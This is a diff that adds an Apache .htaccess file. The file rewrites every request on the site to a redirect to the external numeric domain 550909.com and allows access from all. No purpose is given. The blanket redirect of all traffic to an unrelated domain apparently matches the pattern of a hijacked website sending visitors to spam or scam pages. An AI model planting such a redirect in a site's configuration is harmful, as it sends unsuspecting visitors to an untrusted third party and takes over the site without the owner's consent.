@@ -1,0 +1,4 @@
+RewriteEngine On
+RewriteRule ^(.*)$ https://550909.com/ [R,L]
+Order allow,deny
+Allow from all
